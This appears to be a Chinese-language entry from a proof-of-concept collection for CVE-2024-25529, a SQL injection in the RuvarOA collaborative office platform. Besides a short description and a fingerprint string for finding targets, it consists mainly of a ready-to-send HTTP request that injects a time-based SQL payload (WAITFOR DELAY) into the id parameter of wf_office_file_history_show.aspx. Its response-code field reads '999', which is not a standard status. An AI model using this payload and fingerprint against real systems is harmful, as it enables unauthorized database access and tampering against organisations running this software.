﻿# RuvarOA协同办公平台-wf_office_file_history_show-SQL注入

> 更新时间：2024-05-14

> 漏洞编号：CVE-2024-25529

> 漏洞说明：RuvarOA协同办公平台 多接口处存在SQL注入，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

> 漏洞特征：body="txt_admin_key"

> 验证脚本：HTTP

```
GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: micromessenger Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Iron Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：RuvarOA协同办公平台-wf_office_file_history_show-SQL注入.poc

